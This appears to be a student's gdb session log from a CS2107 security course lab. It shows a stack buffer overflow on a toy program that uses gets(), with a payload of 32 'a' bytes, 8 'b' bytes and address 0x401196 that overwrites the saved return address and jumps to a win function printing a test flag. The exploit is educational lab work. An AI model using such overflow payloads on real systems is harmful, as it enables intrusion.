```
Breakpoint 1, main () at vuln.c:15
15        gets(buf);
(gdb) aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Undefined command: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".  Try "help".
(gdb) x/24x $sp
0x7fffffffe960: 0x00000000      0x00000000      0x004010b0      0x00000000
0x7fffffffe970: 0xffffea70      0x00007fff      0x00000000      0x00000000
0x7fffffffe980: 0x00000000      0x00000000      0xf7def0b3      0x00007fff
0x7fffffffe990: 0xf7ffc620      0x00007fff      0xffffea78      0x00007fff
0x7fffffffe9a0: 0x00000000      0x00000001      0x004011bc      0x00000000
0x7fffffffe9b0: 0x00401200      0x00000000      0x1bcf6363      0xca98dd02
(gdb) info frame
Stack level 0, frame at 0x7fffffffe990:
 rip = 0x4011e0 in main (vuln.c:15); saved rip = 0x7ffff7def0b3
 source language c.
 Arglist at 0x7fffffffe958, args:
 Locals at 0x7fffffffe958, Previous frame's sp is 0x7fffffffe990
 Saved registers:
  rbp at 0x7fffffffe980, rip at 0x7fffffffe988
(gdb) continue
Continuing.

Breakpoint 3, _IO_gets (buf=0x7fffffffe960 "") at iogets.c:32
32      iogets.c: No such file or directory.
(gdb) info frame
Stack level 0, frame at 0x7fffffffe960:
 rip = 0x7ffff7e4e9a0 in _IO_gets (iogets.c:32); saved rip = 0x4011f1
 called by frame at 0x7fffffffe990
 source language c.
 Arglist at 0x7fffffffe950, args: buf=0x7fffffffe960 ""
 Locals at 0x7fffffffe950, Previous frame's sp is 0x7fffffffe960
 Saved registers:
  rip at 0x7fffffffe958
(gdb) x/24x $sp
0x7fffffffe958: 0x004011f1      0x00000000      0x00000000      0x00000000
0x7fffffffe968: 0x004010b0      0x00000000      0xffffea70      0x00007fff
0x7fffffffe978: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe988: 0xf7def0b3      0x00007fff      0xf7ffc620      0x00007fff
0x7fffffffe998: 0xffffea78      0x00007fff      0x00000000      0x00000001
0x7fffffffe9a8: 0x004011bc      0x00000000      0x00401200      0x00000000
(gdb) x/24x 0x7fffffffe950
0x7fffffffe950: 0x00000002      0x00000000      0x004011f1      0x00000000
0x7fffffffe960: 0x00000000      0x00000000      0x004010b0      0x00000000
0x7fffffffe970: 0xffffea70      0x00007fff      0x00000000      0x00000000
0x7fffffffe980: 0x00000000      0x00000000      0xf7def0b3      0x00007fff
0x7fffffffe990: 0xf7ffc620      0x00007fff      0xffffea78      0x00007fff
0x7fffffffe9a0: 0x00000000      0x00000001      0x004011bc      0x00000000

Breakpoint 2, main () at vuln.c:16
16        return 0;
(gdb) x/24x $ra
Value can't be converted to integer.
(gdb) x/24x $sp
0x7fffffffe960: 0x00000000      0x00000000      0x004010b0      0x00000000
0x7fffffffe970: 0xffffea70      0x00007fff      0x00000000      0x00000000
0x7fffffffe980: 0x00000000      0x00000000      0xf7def0b3      0x00007fff
0x7fffffffe990: 0xf7ffc620      0x00007fff      0xffffea78      0x00007fff
0x7fffffffe9a0: 0x00000000      0x00000001      0x004011bc      0x00000000
0x7fffffffe9b0: 0x00401200      0x00000000      0x1bcf6363      0xca98dd02
(gdb) info frame
Stack level 0, frame at 0x7fffffffe990:
 rip = 0x4011f1 in main (vuln.c:16); saved rip = 0x7ffff7def0b3
 source language c.
 Arglist at 0x7fffffffe958, args:
 Locals at 0x7fffffffe958, Previous frame's sp is 0x7fffffffe990
 Saved registers:
  rbp at 0x7fffffffe980, rip at 0x7fffffffe988
(gdb)


Breakpoint 2, _IO_gets (buf=0x7fffffffe960 "") at iogets.c:32
32      iogets.c: No such file or directory.
(gdb) x/24x $sp
0x7fffffffe958: 0x004011f1      0x00000000      0x00000000      0x00000000
0x7fffffffe968: 0x004010b0      0x00000000      0xffffea70      0x00007fff
0x7fffffffe978: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe988: 0xf7def0b3      0x00007fff      0xf7ffc620      0x00007fff
0x7fffffffe998: 0xffffea78      0x00007fff      0x00000000      0x00000001
0x7fffffffe9a8: 0x004011bc      0x00000000      0x00401200      0x00000000
(gdb) continue
Continuing.
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdef

Breakpoint 1, main () at vuln.c:16
16        return 0;
(gdb) x/24x $sp
0x7fffffffe960: 0x61616161      0x61616161      0x61616161      0x61616161
0x7fffffffe970: 0x61616161      0x61616161      0x61616161      0x61616161
0x7fffffffe980: 0x65646362      0x00000066      0xf7def0b3      0x00007fff
0x7fffffffe990: 0xf7ffc620      0x00007fff      0xffffea78      0x00007fff
0x7fffffffe9a0: 0x00000000      0x00000001      0x004011bc      0x00000000
0x7fffffffe9b0: 0x00401200      0x00000000      0xe4445d59      0xc5cc1a70
(gdb)
```
input: `32 * a, 8 * b, 0x401196`



```
Starting program: /home/c/chang-ch/CS2107/vuln < payload
win addr:0x401196

Breakpoint 2, _IO_gets (buf=0x7fffffffe960 "") at iogets.c:32
32      iogets.c: No such file or directory.
(gdb) x/24x $sp
0x7fffffffe958: 0x004011f1      0x00000000      0x00000000      0x00000000
0x7fffffffe968: 0x004010b0      0x00000000      0xffffea70      0x00007fff
0x7fffffffe978: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe988: 0xf7def0b3      0x00007fff      0xf7ffc620      0x00007fff
0x7fffffffe998: 0xffffea78      0x00007fff      0x00000000      0x00000001
0x7fffffffe9a8: 0x004011bc      0x00000000      0x00401200      0x00000000
(gdb) continue
Continuing.

Breakpoint 3, main () at vuln.c:16
16        return 0;
(gdb) x/24x 0x7fffffffe958
0x7fffffffe958: 0x004011f1      0x00000000      0x61616161      0x61616161
0x7fffffffe968: 0x61616161      0x61616161      0x61616161      0x61616161
0x7fffffffe978: 0x61616161      0x61616161      0x61616161      0x61616161
0x7fffffffe988: 0x00401196      0x00000000      0xf7ff0000      0x00007fff
0x7fffffffe998: 0xffffea78      0x00007fff      0x00000000      0x00000001
0x7fffffffe9a8: 0x004011bc      0x00000000      0x00401200      0x00000000
(gdb) info frame
Stack level 0, frame at 0x7fffffffe990:
 rip = 0x4011f1 in main (vuln.c:16); saved rip = 0x401196
 source language c.
 Arglist at 0x7fffffffe958, args:
 Locals at 0x7fffffffe958, Previous frame's sp is 0x7fffffffe990
 Saved registers:
  rbp at 0x7fffffffe980, rip at 0x7fffffffe988
(gdb) continue
Continuing.
CS2107{test_flag}

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7feff5a in ?? () from /lib64/ld-linux-x86-64.so.2
```